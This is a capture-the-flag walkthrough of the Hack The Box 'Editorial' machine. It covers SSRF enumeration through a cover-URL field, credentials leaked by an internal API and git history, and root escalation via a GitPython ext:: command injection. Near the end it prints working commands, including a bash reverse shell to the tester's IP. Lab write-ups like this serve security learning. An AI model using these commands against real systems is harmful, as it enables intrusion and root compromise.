---
description: >-
  `Editorial` is an easy difficulty Linux machine that features a publishing web
  application.
---

# HTB Editorial

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

### Port scan

We find 2 open ports, ssh on port 22 and http on port 80. The nmap also shows [http://editorial.htb](http://editorial.htb) so we add this to `/etc/hosts`.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Going to `http://editorial.htb` we find a website which is running a book upload page on `/upload` Looking at the page for possible input, we find:

* Cover URL where URL can be specificied.
* File upload
* Several fields/parameters like email

<figure><img src="broken-reference" alt=""><figcaption><p>Also notice the preview button and send button.</p></figcaption></figure>

### File upload

Using the preview button. It works uploading a .php file but its unclear where and how the .php file is saved.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

### SSRF

{% embed url="https://www.youtube.com/watch?ab_channel=Intigriti&v=3dKavgfL2pA" %}

Checking the URL book cover field and using`http://10.10.14.38:443/test` results in connecting to my nc on port 443.

<figure><img src="broken-reference" alt=""><figcaption><p>Insert your IP</p></figcaption></figure>

<figure><img src="broken-reference" alt=""><figcaption><p>Catch connection on VM</p></figcaption></figure>

Looking at the response its returning the location and filename of uploaded files.

<figure><img src="broken-reference" alt=""><figcaption><p>HTTP Response showing upload filename</p></figcaption></figure>

This reveals the files are upload to /static/uploads with filenames formatted like 25146e36-1fa1-4b20-9773-116cc83c0e55. Uploading a simple webshell .php file works but its not being executed.

To check whether the HTTP is vulnerable for SSRF, lets see if the web application returns anything by providing the URL `http://127.0.0.1/index.php` but its not returning anything.

<details>

<summary>Protocols and schemes</summary>

SSRF is not restricted to the HTTP protocol only; it can be applied to various other protocols like FTP, SMB, and SMTP. Also, different schemes, such as `data://` and `file://`, can be leveraged in SSRF.

</details>

### SSRF port scan

Doing more enumeration we found a SSRF vulnerability by conducting a port scan of the system to find running services using FFUF. We let the server scan itself on all 65535 port which returned an open port on 5000.

```bash
# Make wordlist
seg 65535 > numbers.txt
```

From burp open a request and insert the FUZZ placeholder. Then copy it to a file.

<figure><img src="broken-reference" alt=""><figcaption><p>Easy way to FUZZ a post request</p></figcaption></figure>

Running FUFF reveals an open port on port 5000

```bash
$ ffuf -request request -request-proto http -w numbers.txt -fs 61

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /home/kali/numbers
 :: Header           : Origin: http://editorial.htb
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Host: editorial.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: */*
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Content-Type: multipart/form-data; boundary=---------------------------399227191530037445241476813042
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Priority: u=0
 :: Data             : -----------------------------399227191530037445241476813042
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------399227191530037445241476813042
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream

-----------------------------399227191530037445241476813042--
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 59ms]
:: Progress: [20000/20000] :: Job [1/1] :: 241 req/sec :: Duration: [0:00:57] :: Errors: 1 ::
```

Visiting the `127.0.0.1:5000` we get a file back in the response, confirming SSRF.

<figure><img src="broken-reference" alt=""><figcaption><p>A .json file is returned on port 5000</p></figcaption></figure>

Downloading the file, its a .json file.

```bash
$ file /home/kali/Downloads/cf3a9723-1f7e-4761-b97c-46342899748f
/home/kali/Downloads/cf3a9723-1f7e-4761-b97c-46342899748f: JSON text data
```

Opening the .json file returns several api endpoints.

```bash
cat /home/kali/Downloads/cf3a9723-1f7e-4761-b97c-46342899748f | jq .
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

We can now go through the api endpoints and download them in .json format. To check the changelog we would use `http://127.0.0.1:5000/api/latest/metadata/changelog` and then open the file returned in the response. Going through the endpoints the `api/latest/metadata/messages/authors` is interesting.

Call the authors api endpoint

<figure><img src="broken-reference" alt=""><figcaption><p>Call the api endpoint on 127.0.0.1</p></figcaption></figure>

In burp check the response for filename.

<figure><img src="broken-reference" alt=""><figcaption><p>Get the filename and curl it</p></figcaption></figure>

Using curl open the file and its where dev credentials are found which we can use to login on SSH.

{% code overflow="wrap" %}
```bash
$ curl http://editorial.htb/static/uploads/4e5a7791-9753-4b73-8178-834ea3663a6a | jq 
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```
{% endcode %}

<figure><img src="broken-reference" alt=""><figcaption><p>Logging in gets user flag.</p></figcaption></figure>

## Git

Opening the `/apps` folder, it shows git is present on the machine `/home/dev/apps/.git`. Which indicates this directory is a Git repository.

{% embed url="https://www.youtube.com/watch?ab_channel=Fireship&v=hwP7WQkmECE" %}

Checking the git logs we find several commits.

{% hint style="info" %}
A **Git commit** is a snapshot of changes in a Git repository. It represents a point in the history of the project, recording the current state of the files (or changes to files) at a specific moment.
{% endhint %}

```bash
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```

Opening git commit 1e84a036b2f33c59e2390730699a488c65643d28 we found new credentials for the user prod.

{% code overflow="wrap" %}
```bash
dev@editorial:~/apps$ git show 1e84a036b2f33c59e2390730699a488c65643d28
commit 1e84a036b2f33c59e2390730699a488c65643d28

# Prod password found
+    return jsonify(data_editorial)
+
+# -- : (development) mail message to new authors
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5001, debug=True)
```
{% endcode %}

## Root

With `su prod` I switch to prod user. And first thing to check is `sudo -l`. Which returns:

{% code overflow="wrap" %}
```bash
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
{% endcode %}

We can run clone\_prod\_change.py as sudo. From a command line argument it asks for a url to clone.

{% code overflow="wrap" %}
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```
{% endcode %}

Looking up `from git import Repo` we find GitPython is used. **GitPython** is a Python library used to interact with Git repositories. It allows to perform Git operations such as cloning repositories in this case in python code.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

<details>

<summary>What is GitPython?</summary>

GitPython is a Python library that lets you run Git commands in Python code instead of the command line.

[https://gitpython.readthedocs.io/en/stable/intro.html](https://gitpython.readthedocs.io/en/stable/intro.html)

</details>

## RCE

{% hint style="info" %}
Remote code execution (RCE) is a type of security [vulnerability ](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)that allows attackers to run arbitrary code. In this case, the code is executed by a file owned by the root user, meaning the commands run with root privileges.
{% endhint %}

Searching for "git import Repo exploit" we find a result on the Snyk website. [https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Comparing the line to the `clone_prod_change.py` script. It shows the `url_to_clone argument` is vulnerable because its lacking proper user input validation.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Running the command from the PoC we find the pwned file in our /tmp folder confirming the RCE has worked.

```bash
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:/home/dev/apps$ ls /tmp
pwned   
```

Finally we write a shell to root.sh in /tmp/root.sh and call the file using the python script resulting in running the root.sh file which would open a new shell on our VM as root user.

{% code overflow="wrap" %}
```bash
prod@editorial:/tmp$ echo 'bash -i >& /dev/tcp/10.10.14.38/9999 0>&1' > root.sh
prod@editorial:/tmp$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/root.sh'
```
{% endcode %}

Giving us as a new shell as root user.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
